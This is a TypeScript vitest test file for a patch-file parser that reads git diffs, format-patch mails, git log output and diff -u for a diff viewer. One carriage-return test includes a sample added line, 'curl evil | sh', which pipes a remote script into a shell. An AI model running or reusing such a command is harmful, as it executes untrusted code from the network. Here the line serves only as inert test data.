import { readFileSync } from "node:fs";
import { join } from "node:path";
import { getSingularPatch } from "@pierre/diffs";
import { describe, expect, test } from "vitest";
import {
  MAX_FILE_PATCH_CHARS,
  MAX_PATCH_FILES,
  readPatchFile,
  type PatchFile,
} from "./patch-file.ts";
import { quotedPath } from "./quoted-path.ts";

const FIXTURES = join(import.meta.dirname, "../../test/fixtures/patch-file");
const START =
  "Line 1 isn't the start of a git diff, git log, git format-patch or diff -u, the forms the diff view draws.";
const BIN = "Line 1 is a binary record outside a git diff, which the diff view doesn't draw.";
const fixture = (name: string) => readFileSync(join(FIXTURES, name), "utf8");

/** The read of a patch the diff view must accept. */
function parsed(text: string): PatchFile {
  const read = readPatchFile(text);
  if (!read.ok) throw new Error(`expected a diff, got text: ${read.reason}`);
  return read.read;
}

/** Why the diff view sends a patch to text. */
function rejected(text: string): string {
  const read = readPatchFile(text);
  if (read.ok) throw new Error("expected text, got a diff");
  return read.reason;
}

/** Each file as path, kind, counts, and whether Pierre can draw its patch. */
function summary(read: PatchFile | null) {
  return read?.commits.map((commit) =>
    commit.files.map(({ file, patch }) => ({
      path: file.path,
      kind: file.kind,
      previousPath: file.previousPath,
      counts: `+${file.additions} -${file.deletions}`,
      binary: file.binary,
      drawn: patch.patch === "" ? null : getSingularPatch(patch.patch).name,
    })),
  );
}

describe("readPatchFile", () => {
  test("git format-patch mail with two commits: headers, renames, added, deleted, binary", () => {
    const read = parsed(fixture("format-patch-two-commits.patch"));
    expect(
      read?.commits.map(({ id, subject, author, date }) => ({ id, subject, author, date })),
    ).toEqual([
      {
        id: "a97a0f96e718208d9111a63688e332a9e3d7651e",
        subject: "Rework files: rename, add, delete",
        author: "Ada Lövelace <ada@example.com>",
        date: "Fri, 2 Jan 2026 03:04:05 +0000",
      },
      {
        id: "5b6545a5d03cfb5b93c46a153f446dbf122d05ad",
        subject: "Add logo and a fourth line",
        author: "Ada Lövelace <ada@example.com>",
        date: "Fri, 2 Jan 2026 03:04:05 +0000",
      },
    ]);
    expect(summary(read)).toEqual([
      [
        {
          path: "added.ts",
          kind: "added",
          previousPath: null,
          counts: "+2 -0",
          binary: false,
          drawn: "added.ts",
        },
        {
          path: "dir with space/after.md",
          kind: "renamed",
          previousPath: "before.md",
          counts: "+0 -0",
          binary: false,
          drawn: null,
        },
        {
          path: "gone.txt",
          kind: "deleted",
          previousPath: null,
          counts: "+0 -1",
          binary: false,
          drawn: "gone.txt",
        },
        {
          path: "keep.txt",
          kind: "modified",
          previousPath: null,
          counts: "+1 -1",
          binary: false,
          drawn: "keep.txt",
        },
      ],
      [
        {
          path: "keep.txt",
          kind: "modified",
          previousPath: null,
          counts: "+1 -0",
          binary: false,
          drawn: "keep.txt",
        },
        {
          path: "logo.png",
          kind: "added",
          previousPath: null,
          counts: "+0 -0",
          binary: true,
          drawn: null,
        },
      ],
    ]);
    expect(read).toMatchObject({ files: 6, additions: 4, deletions: 2 });
  });

  test("the mail signature and diffstat stay out of every file's patch", () => {
    const read = parsed(fixture("format-patch-two-commits.patch"))!;
    for (const { patch } of read.commits.flatMap((commit) => commit.files)) {
      expect(patch.patch).not.toMatch(/^-- $/m);
      expect(patch.patch).not.toMatch(/files? changed/);
    }
  });

  test("a GIT binary patch body is skipped, and the file is marked binary", () => {
    const read = parsed(fixture("format-patch-git-binary.patch"));
    expect(summary(read)).toEqual([
      [
        {
          path: "keep.txt",
          kind: "modified",
          previousPath: null,
          counts: "+1 -0",
          binary: false,
          drawn: "keep.txt",
        },
        {
          path: "logo.png",
          kind: "added",
          previousPath: null,
          counts: "+0 -0",
          binary: true,
          drawn: null,
        },
      ],
    ]);
  });

  test("git diff across commits: a pure rename has no patch, but keeps both paths", () => {
    const read = parsed(fixture("git-diff-renames.diff"));
    expect(read?.commits).toHaveLength(1);
    expect(read?.commits[0]).toMatchObject({ id: null, subject: null });
    expect(summary(read)![0]!.map((file) => [file.path, file.kind, file.previousPath])).toEqual([
      ["added.ts", "added", null],
      ["dir with space/after.md", "renamed", "before.md"],
      ["gone.txt", "deleted", null],
      ["keep.txt", "modified", null],
      ["logo.png", "added", null],
    ]);
  });

  test("git log -p: one section per commit, subject from the indented message", () => {
    const read = parsed(fixture("git-log-p.patch"));
    expect(
      read?.commits.map((commit) => [commit.id?.slice(0, 7), commit.subject, commit.files.length]),
    ).toEqual([
      ["5b6545a", "Add logo and a fourth line", 2],
      ["a97a0f9", "Rework files: rename, add, delete", 4],
    ]);
    expect(read?.commits[0]!.author).toBe("Ada Lövelace <ada@example.com>");
  });

  test("plain diff -u output, with timestamps after the paths", () => {
    expect(summary(parsed(fixture("plain-diff-u.diff")))).toEqual([
      [
        {
          path: "b.txt",
          kind: "modified",
          previousPath: null,
          counts: "+1 -1",
          binary: false,
          drawn: "b.txt",
        },
      ],
    ]);
  });

  test("hunks are walked by count: removed lines that look like headers stay inside", () => {
    const text = [
      "diff --git a/notes.md b/notes.md",
      "--- a/notes.md",
      "+++ b/notes.md",
      "@@ -1,4 +1,2 @@",
      "-- dash",
      "-diff --git a/x b/x",
      " kept",
      "",
      "\\ No newline at end of file",
      "diff --git a/next.md b/next.md",
      "--- a/next.md",
      "+++ b/next.md",
      "@@ -1 +1 @@",
      "-a",
      "+b",
      "",
    ].join("\n");
    expect(summary(parsed(text))![0]!.map((file) => [file.path, file.counts])).toEqual([
      ["notes.md", "+0 -2"],
      ["next.md", "+1 -1"],
    ]);
  });

  test("a git diff without index lines (as an agent writes one) still draws", () => {
    const text = [
      "diff --git a/README.md b/README.md",
      "--- a/README.md",
      "+++ b/README.md",
      "@@ -1,2 +1,2 @@",
      " # Title",
      "-old",
      "+new",
      "diff --git a/scripts/probe.mjs b/scripts/probe.mjs",
      "--- a/scripts/probe.mjs",
      "+++ b/scripts/probe.mjs",
      "@@ -1 +1 @@",
      '-import a from "a";',
      '+import b from "b";',
    ].join("\n");
    expect(summary(parsed(text))![0]!.map((file) => file.drawn)).toEqual([
      "README.md",
      "scripts/probe.mjs",
    ]);
  });

  test("a path twice draws as two cards in one section, each with its own key", () => {
    const file = "--- a/x.txt\n+++ b/x.txt\n@@ -1 +1 @@\n-a\n+b\n";
    const read = parsed(`${file}${file}`);
    expect(read.commits).toHaveLength(1);
    const files = read.commits[0]!.files;
    expect(files.map((entry) => entry.file.path)).toEqual(["x.txt", "x.txt"]);
    // Keyed by path and occurrence, so a re-read with a file added above keeps each card's key.
    expect(files.map((entry) => entry.key)).toEqual(["1:x.txt", "2:x.txt"]);
    const again = parsed(`--- a/w.txt\n+++ b/w.txt\n@@ -1 +1 @@\n-a\n+b\n${file}${file}`);
    expect(again.commits[0]!.files.map((entry) => entry.key)).toEqual([
      "1:w.txt",
      "1:x.txt",
      "2:x.txt",
    ]);
  });

  test("a message line that reads like a commit line does not start a section", () => {
    const sha = "a97a0f96e718208d9111a63688e332a9e3d7651e";
    const text = [
      `From ${sha} Mon Sep 17 00:00:00 2001`,
      "From: Ada <ada@example.com>",
      "Date: Mon, 1 Jan 2024 00:00:00 +0000",
      "Subject: [PATCH] Revert the bad one",
      "",
      `commit ${sha} broke the build; this reverts it.`,
      `From ${sha} is mentioned here too.`,
      "---",
      "diff --git a/x.txt b/x.txt",
      "--- a/x.txt",
      "+++ b/x.txt",
      "@@ -1 +1 @@",
      "-a",
      "+b",
    ].join("\n");
    const read = parsed(text);
    expect(read?.commits.map((commit) => [commit.subject, commit.files.length])).toEqual([
      ["Revert the bad one", 1],
    ]);
  });

  test("CRLF line endings read as LF", () => {
    const text = "--- a/x.txt\r\n+++ b/x.txt\r\n@@ -1 +1 @@\r\n-a\r\n+b\r\n";
    expect(summary(parsed(text))).toEqual([
      // Pierre keeps the b/ prefix of a diff with no `diff --git` line; the card shows `path`.
      [
        {
          path: "x.txt",
          kind: "modified",
          previousPath: null,
          counts: "+1 -1",
          binary: false,
          drawn: "b/x.txt",
        },
      ],
    ]);
  });

  test("quoted git paths are unquoted, octal escapes as UTF-8, astral characters intact", () => {
    expect(quotedPath('"caf\\303\\251 \\"x\\".txt"')).toBe('café "x".txt');
    expect(quotedPath('"a \\"q\\" 😀.txt"')).toBe('a "q" 😀.txt');
    const text = [
      'diff --git "a/caf\\303\\251.txt" "b/caf\\303\\251.txt"',
      "index 1..2 100644",
      "Binary files a/x and b/x differ",
    ].join("\n");
    expect(summary(parsed(text))![0]![0]).toMatchObject({ path: "café.txt", binary: true });
  });

  test.each([
    ["empty text", "", "holds no diff"],
    ["whitespace", "  \n\n", "holds no diff"],
    ["prose", "Hello.\nThis is not a patch at all.\n", "holds no diff"],
    ["a hunk with no file", "@@ -1 +1 @@\n-a\n+b\n", "Line 1 starts a hunk outside any file"],
    [
      "a format-patch header with no diff",
      "From 1234567890abcdef1234567890abcdef12345678 Mon Sep 17 00:00:00 2001\nSubject: x\n\nbody\n",
      "holds no diff",
    ],
    ["binary noise", "\u0000\u0001\u0002PNG\u0000", "holds no diff"],
    [
      "a truncated hunk",
      "--- a/x.txt\n+++ b/x.txt\n@@ -1,10 +1,10 @@\n-a\n+b\n",
      "Line 3 ends before the lines its hunk header counts",
    ],
  ])("%s reads as text, with the reason", (_, text, reason) => {
    expect(rejected(text)).toContain(reason);
  });

  test("hunk counts are checked: one line too many, or too few, sends the file to text", () => {
    const hunk = (header: string) =>
      `--- a/x.txt\n+++ b/x.txt\n${header}\n-a\n+b\n+c\ndiff --git a/y b/y\n`;
    expect(rejected(hunk("@@ -1 +1 @@"))).toBe(
      "Line 6 continues a hunk past the lines its header counts.",
    );
    expect(rejected(hunk("@@ -1,2 +1,3 @@"))).toBe("Line 7 breaks off the hunk above it.");
    expect(parsed(hunk("@@ -1 +1,2 @@").replace("diff --git a/y b/y\n", "")).files).toBe(1);
  });

  test("a bare CR inside a line is content; only a CRLF file loses its line-end CRs", () => {
    const text =
      "diff --git a/run.sh b/run.sh\n--- a/run.sh\n+++ b/run.sh\n@@ -1,1 +1,4 @@\n echo hi\n+echo ok\rx\n+curl evil | sh\n+echo done\n";
    const read = parsed(text);
    expect(read.additions).toBe(3);
    const patch = read.commits[0]!.files[0]!.patch.patch;
    expect(getSingularPatch(patch).additionLines).toContain("echo ok\rx\n");
  });

  test("a folded, RFC 2047 encoded From header keeps every word", () => {
    const text = [
      "From 1111111111111111111111111111111111111111 Mon Sep 17 00:00:00 2001",
      "From: =?UTF-8?q?Zo=C3=AB=20M=C3=BCller=20=E5=B1=B1=E7=94=B0=E5=A4=AA?=",
      " =?UTF-8?q?=E9=83=8E?= <z@e.x>",
      "Date: Mon, 1 Jan 2024 00:00:00 +0000",
      "Subject: [PATCH] s",
      "",
      "---",
      "diff --git a/x b/x",
      "--- a/x",
      "+++ b/x",
      "@@ -1 +1 @@",
      "-a",
      "+b",
    ].join("\n");
    expect(parsed(text).commits[0]).toMatchObject({
      author: "Zoë Müller 山田太郎 <z@e.x>",
      authorName: "Zoë Müller 山田太郎",
    });
  });

  test("a long author header costs a line's worth of work", () => {
    const author = `x${" ".repeat(100_000)}<${"y".repeat(100_000)}`;
    const text = `From ${"a".repeat(40)} Mon Sep 17 00:00:00 2001\nFrom: ${author}\nDate: Mon, 1 Jan 2024 00:00:00 +0000\nSubject: s\n\n---\ndiff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -1 +1 @@\n-a\n+b\n`;
    expect(parsed(text).commits[0]!.authorName!.length).toBeLessThanOrEqual(2001);
  });

  test("past MAX_PATCH_FILES files, the rest are counted, not drawn", () => {
    const read = parsed("--- a\n+++ a\n@@ -1 +1 @@\n-a\n+b\n".repeat(MAX_PATCH_FILES + 5));
    expect(read.files).toBe(MAX_PATCH_FILES);
    expect(read.omitted).toBe(5);
    expect(read.additions).toBe(MAX_PATCH_FILES + 5);
  });

  test("a file's patch past MAX_FILE_PATCH_CHARS is marked too large rather than drawn", () => {
    const line = "x".repeat(MAX_FILE_PATCH_CHARS + 1);
    const entry = parsed(`--- a/m.js\n+++ b/m.js\n@@ -1 +1 @@\n-${line}\n+y\n`).commits[0]!
      .files[0]!;
    expect(entry.patch).toMatchObject({ patch: "", truncated: true });
    expect(entry.file).toMatchObject({ additions: 1, deletions: 1 });
  });
});

describe("review fixtures", () => {
  test.each([
    ["undercount.patch", "Line 9 continues a hunk past the lines its header counts."],
    [
      "overcount-plain.diff",
      "Line 3 is a hunk whose counts run into the next file's --- / +++ header.",
    ],
    ["badhunk.patch", "Line 3 has a file header with no hunk after it."],
    ["prose.diff", START],
    ["prose2.patch", START],
    // Hand-made: format-patch always writes a Date line.
    ["truncated-sig.patch", "Line 1 starts a mail with no Date line."],
    [
      "git-show-merge-cc.patch",
      "Line 8 is part of a combined merge diff, which the diff view can't show.",
    ],
  ])("malformed/%s reads as text: %s", (name, reason) => {
    expect(rejected(fixture(`malformed/${name}`))).toBe(reason);
  });

  test.each(["plain-context.diff"])("review/%s (no unified diff) reads as text", (name) => {
    expect(rejected(fixture(`review/${name}`))).toBe(START);
  });

  test("valid inputs git accepts still draw", () => {
    const counts = (name: string) =>
      parsed(fixture(`review/${name}`)).commits.flatMap((commit) =>
        commit.files.map(({ file }) => `${file.path} +${file.additions} -${file.deletions}`),
      );
    expect(counts("blankctx.patch")).toEqual(["f.txt +1 -1"]);
    expect(counts("samepath.patch")).toEqual(["f.txt +1 -1", "f.txt +1 -1"]);
    expect(counts("sqlish.patch")).toEqual(["q.sql +1 -1"]);
    expect(counts("sqlish-plain.diff")).toEqual(["q.sql +1 -1"]);
    // svn's Index: form is outside the forms the diff view draws.
    expect(rejected(fixture("review/svn.diff"))).toBe(START);
  });

  test("custom, mnemonic and missing prefixes give the repository path", () => {
    const paths = (name: string) =>
      parsed(fixture(`review/${name}`)).commits.flatMap((commit) =>
        commit.files.map(({ file }) => file.path),
      );
    const expected = paths("git-diff.diff");
    expect(expected).toHaveLength(19);
    expect(paths("git-diff-customprefix.diff")).toEqual(expected);
    expect(paths("git-diff-noprefix.diff")).toEqual(expected);
    expect(expected).toEqual(expect.arrayContaining(["a/ina.txt", "b/inb.txt", "dir b/x y.txt"]));
    expect(paths("git-diff-mnemonic-wt.diff")).toEqual(["keep.txt"]);
    expect(paths("git-diff.diff")).not.toContain("(unknown file)");
    expect(
      parsed("--- /dev/null\n+++ b/x.txt\n@@ -0,0 +1 @@\n+a\n").commits[0]!.files[0]!.file,
    ).toMatchObject({
      path: "x.txt",
      kind: "added",
    });
  });

  test("a --- / +++ pair in a format-patch message is the author's text, not a file", () => {
    const read = parsed(fixture("review/format-patch-single.patch"));
    expect(read.files).toBe(19);
    expect(read.commits[0]!.files.map(({ file }) => file.path)).not.toContain("new behaviour");
  });

  test("diff -r's one-line binary pair reads as text", () => {
    expect(rejected("Binary files a/nul.dat and b/nul.dat differ\n")).toBe(BIN);
  });

  test("diff -r's Only in records read as text, never dropped", () => {
    expect(rejected(fixture("review/plain-ru-nul.diff"))).toBe(
      "Line 22 names a file only one side has (Only in), which the diff view can't show.",
    );
  });

  test("a hunk that runs back before the one above it reads as text", () => {
    expect(rejected(fixture("review/omitted.patch"))).toBe(
      "Line 7 starts a hunk inside or before the hunk above it.",
    );
  });
});

describe("review round 2 fixtures", () => {
  const read = (name: string) => readPatchFile(fixture(`review2/${name}`));
  const files = (name: string) =>
    parsed(fixture(`review2/${name}`)).commits.flatMap((c) => c.files);

  test("a blank line standing for context is read as that context line", () => {
    const [entry] = files("blank-context.patch");
    expect(entry!.file).toMatchObject({ additions: 1, deletions: 1 });
    expect(entry!.patch.patch.split("\n").slice(3, 8)).toEqual([
      "@@ -1,3 +1,3 @@",
      " a",
      " ",
      "-b",
      "+B",
    ]);
    expect(files("gnu-suppress-blank-empty.diff").map(({ file }) => file.path)).toEqual(["x.txt"]);
  });

  test("a signature after a plain git diff, not a mail, reads as text", () => {
    expect(rejected(fixture("review2/sig-nospace.patch"))).toBe(
      "Line 8 continues a hunk past the lines its header counts.",
    );
  });

  test.each([
    ["under-blank-extra.patch", "Line 8 isn't part of any file the diff view knows."],
    ["two-hunks-blank-late.patch", "Line 12 isn't part of any file the diff view knows."],
    ["trailing-bullets.patch", "Line 8 isn't part of any file the diff view knows."],
    ["r1-badheader.patch", "Line 2 has a file header with no hunk after it."],
  ])("%s reads as text: %s", (name, reason) => {
    expect(read(name)).toEqual({ ok: false, reason });
  });

  test("diff -r binary records read as text, however their names are quoted", () => {
    for (const name of ["gnu-ru-binary.diff", "gnu-ru-names.diff", "plain-binary-and.diff"])
      expect(rejected(fixture(`review2/${name}`))).toBe(BIN);
    expect(rejected("Binary files a/q and b/q and c/q differ\n")).toBe(BIN);
  });

  test("a long line of ' and ' is read in one pass", () => {
    // Quadratic before: 420 KB took 10 s, past the test's timeout.
    expect(rejected(`Binary files a${" and x".repeat(70_000)}\n`)).toBe(BIN);
    expect(rejected(`Binary files a${" and x".repeat(70_000)} differ\n`)).toBe(BIN);
  });

  test("a quoted path of 300 KB unquotes without overflowing the stack", () => {
    const name = "a".repeat(300_000);
    expect(quotedPath(`"${name}\\303\\251"`)).toBe(`${name}é`);
    const rename = `diff --git a/x b/y\nsimilarity index 100%\nrename from "${name}"\nrename to y\n`;
    expect(files2(rename)).toEqual([["y", "renamed", name]]);
  });

  test("format-patch --attach and --inline are MIME mails, read as text", () => {
    for (const name of ["format-patch-attach.patch", "format-patch-inline.patch"])
      expect(rejected(fixture(`review2/${name}`))).toBe(
        "Line 6 is a MIME mail with parts, which the diff view doesn't read.",
      );
  });

  test("git log --abbrev-commit starts a section per commit; --format=fuller reads as text", () => {
    const commits = parsed(fixture("review2/log-abbrev.patch")).commits;
    expect(commits.map((c) => [c.subject, c.files.length])).toEqual([
      ["second: edit, delete, add", 3],
      ["first commit", 2],
    ]);
    expect(rejected(fixture("review2/log-fuller-stat.patch"))).toBe(
      "Line 3 isn't git log's default Date line, which the diff view needs.",
    );
    // --oneline has no commit lines: its subjects fall between files, which the strict reading refuses.
    expect(read("log-oneline-stat.patch")).toMatchObject({ ok: false });
  });
});

function files2(text: string) {
  return parsed(text).commits.flatMap((c) =>
    c.files.map(({ file }) => [file.path, file.kind, file.previousPath]),
  );
}

describe("review round 3", () => {
  const one = "--- a/f.txt\n+++ b/f.txt\n@@ -1 +1 @@\n-a\n+b\n";

  test("a deletion line that looks like a MIME boundary is not one", () => {
    expect(rejected(`${one}--flag\n`)).toBe(
      "Line 6 continues a hunk past the lines its header counts.",
    );
    expect(rejected(`${one}\n--flag\n`)).toBe("Line 6 isn't part of any file the diff view knows.");
  });

  test("a bare --label binary name reads as text, as any diff -r binary record", () => {
    expect(rejected("Binary files a/dir\\file and b/dir\\file differ\n")).toBe(BIN);
  });

  test("a decoded path with a NUL reads as text", () => {
    expect(rejected('--- "a/x\\000y"\n+++ "b/x\\000y"\n@@ -1 +1 @@\n-a\n+b\n')).toBe(
      "Line 1 names a file with a NUL character, which no file name holds.",
    );
  });

  test("keys stay unique whatever the paths hold", () => {
    const text = ["2:x", "x", "x", "1:x"]
      .map((name) => `--- a/${name}\n+++ b/${name}\n@@ -1 +1 @@\n-a\n+b\n`)
      .join("");
    const keys = parsed(text).commits[0]!.files.map((entry) => entry.key);
    expect(new Set(keys).size).toBe(4);
  });

  test("empty binary names read as text", () => {
    expect(rejected("Binary files  and  differ\n")).toBe(BIN);
  });
});

describe("review round 3 corpus", () => {
  const read = (name: string) => readPatchFile(fixture(`review3/${name}`));

  test("an mbox series with b4's From lines is outside the forms the diff view draws", () => {
    expect(read("mbox-series.patch")).toEqual({ ok: false, reason: START });
  });

  test.each([
    ["under-stray-extra.patch", "Line 8 isn't part of any file the diff view knows."],
    ["svn-props.diff", START],
    ["log-custom-format.patch", START],
  ])("%s reads as text: %s", (name, reason) => {
    expect(read(name)).toEqual({ ok: false, reason });
  });
});

describe("review round 4: a strict second reading", () => {
  const read = (name: string) => readPatchFile(fixture(`review4/${name}`));
  const summary4 = (name: string) => {
    const result = read(name);
    if (!result.ok) return result.reason;
    return result.read.commits.map((c) => [
      c.subject,
      c.files.map(({ file }) => `${file.path} +${file.additions} -${file.deletions}`),
    ]);
  };

  // Round 4 drew these two; round 5 narrowed the input to git's default forms, so they read as text.
  test("a custom git log format reads as text", () => {
    expect(summary4("custom-log.patch")).toBe(
      "Line 3 isn't git log's default Date line, which the diff view needs.",
    );
  });

  test("a mail whose Subject runs straight into its diff reads as text", () => {
    expect(summary4("mail-separator-removed.patch")).toBe(
      "Line 7 reads as part of a patch inside the mail's message, before its --- line.",
    );
  });

  test.each([
    [
      "only-in.diff",
      "Line 1 names a file only one side has (Only in), which the diff view can't show.",
    ],
    ["empty-label.diff", "Line 2 names no file, so the diff view can't be sure of it."],
    [
      "two-files-bad-counts.diff",
      "Line 3 is a hunk whose counts run into the next file's --- / +++ header.",
    ],
  ])("%s reads as text: %s", (name, reason) => {
    expect(read(name)).toEqual({ ok: false, reason });
  });

  test("the control draws both files", () => {
    expect(summary4("two-files.diff")).toEqual([[null, ["first +1 -1", "second +1 -1"]]]);
  });
});

describe("review round 5: only the forms the diff view knows draw", () => {
  const read = (name: string) => readPatchFile(fixture(`review5/${name}`));

  test.each([
    // 1: a diff inside a mail's message, which git am would apply and the cards would hide.
    [
      "inline.mbox.patch",
      "Line 6 reads as part of a patch inside the mail's message, before its --- line.",
    ],
    [
      "only.mbox.patch",
      "Line 6 reads as part of a patch inside the mail's message, before its --- line.",
    ],
    // 2: counts that run on into the next file's header.
    [
      "inflated-counts.diff",
      "Line 3 is a hunk whose counts run into the next file's --- / +++ header.",
    ],
    // 3: git diff --submodule=log.
    ["submodule.patch", "Line 1 is a submodule log, which the diff view doesn't draw."],
    // 4: a diff -u binary record after a git binary file.
    [
      "binary-pair.diff",
      "Line 4 is a binary record outside a git diff, which the diff view doesn't draw.",
    ],
    // 5: a deleted file whose +++ names a file.
    ["kind.patch", "Line 4 says its file is deleted but +++ names a file."],
    // 6: a backslash line git doesn't write.
    ["marker.patch", "Line 6 is a \\ line git doesn't write."],
    // 7: quoted-printable mail.
    [
      "encoding.patch",
      "Line 7 encodes its text as quoted-printable, which the diff view doesn't decode.",
    ],
    // 8: a mail with no files.
    ["empty-mail.patch", "Line 21 starts a mail with no files, which the diff view can't show."],
    // 9: an in-body From that git am takes as the author.
    [
      "relay.patch",
      "Line 9 overrides the mail's header in its body, which the diff view doesn't follow.",
    ],
    // Follow-up: git show --format=raw.
    ["raw.patch", "Line 2 isn't git log's default Author line, which the diff view needs."],
  ])("%s reads as text: %s", (name, reason) => {
    expect(read(name)).toEqual({ ok: false, reason });
  });

  test("10: a path with a character outside the BMP and an escaped tab draws by its name", () => {
    const files = parsed(fixture("review5/astro.patch")).commits[0]!.files;
    expect(files.map(({ file }) => [file.path, file.kind, file.additions, file.deletions])).toEqual(
      [["astral\u{1F600}\tq", "modified", 1, 1]],
    );
  });

  test("a name with trailing spaces keeps them, as git writes it before a tab", () => {
    const files = parsed(fixture("review5/space.patch")).commits[0]!.files;
    expect(files.map(({ file }) => file.path)).toEqual(["spaced "]);
  });

  test("an unchanged file after a fileless commit in git log reads as text", () => {
    const log = fixture("real/git-log-p-scratch.patch");
    const empty = `commit ${"f".repeat(40)}\nAuthor: T <t@t>\nDate:   Mon Jan 1 00:00:00 2024 +0000\n\n    empty\n\n`;
    expect(rejected(`${empty}${log}`)).toBe(
      "Line 1 starts a commit with no files, which the diff view can't show.",
    );
  });
});

describe("real output from this repository still draws", () => {
  const shown = (name: string) => {
    const read = parsed(fixture(`real/${name}`));
    return read.commits.map((commit) => [
      commit.subject,
      commit.files.map(
        ({ file }) => `${file.kind} ${file.path} +${file.additions} -${file.deletions}`,
      ),
    ]);
  };
  const SCRATCH = [
    "added added.txt +1 -0",
    "modified blob.bin +0 -0",
    "deleted gone.txt +0 -1",
    "modified keep.txt +2 -1",
    "renamed new-name.txt +0 -0",
    "modified run.sh +0 -0",
  ];

  test("git diff with mnemonic prefixes, new, deleted, renamed, mode and binary files", () => {
    expect(shown("git-diff-staged.diff")).toEqual([[null, SCRATCH]]);
    expect(shown("git-diff-binary.diff")).toEqual([[null, SCRATCH]]);
  });

  test("git format-patch of the same commit", () => {
    expect(shown("format-patch-scratch.patch")).toEqual([["change things", SCRATCH]]);
  });

  test("git log -p over two commits", () => {
    const commits = shown("git-log-p-scratch.patch");
    expect(commits.map(([subject]) => subject)).toEqual(["change things", "init"]);
    expect(commits[0]![1]).toEqual(SCRATCH);
  });

  test("diff -u of one file, of several, and diff -ru of two directories", () => {
    expect(shown("diff-u-one.diff")).toEqual([[null, ["modified f.txt +1 -1"]]]);
    expect(shown("diff-u-multi.diff")).toEqual([
      [null, ["modified f.txt +1 -1", "modified sub/g.txt +0 -1"]],
    ]);
    expect(shown("diff-ru-dirs.diff")).toEqual([
      [null, ["modified f.txt +1 -1", "modified sub/g.txt +0 -1"]],
    ]);
  });

  test("the task's own patch: git sections with no index lines, a new and a deleted file by /dev/null", () => {
    const [commit] = shown("migration.patch");
    expect(commit![1]).toHaveLength(11);
    expect((commit![1] as string[]).filter((file) => !file.startsWith("modified"))).toEqual([
      "added scripts/lib/browser.mjs +102 -0",
      "deleted scripts/lib/playwright-loader.mjs +0 -32",
    ]);
  });

  test.each(["git-show.patch", "git-diff-commits.diff", "git-log-p.patch", "format-patch.patch"])(
    "this repository's %s draws every file",
    (name) => {
      const read = parsed(fixture(`real/${name}`));
      expect(read.files).toBeGreaterThan(0);
      expect(read.omitted).toBe(0);
    },
  );
});
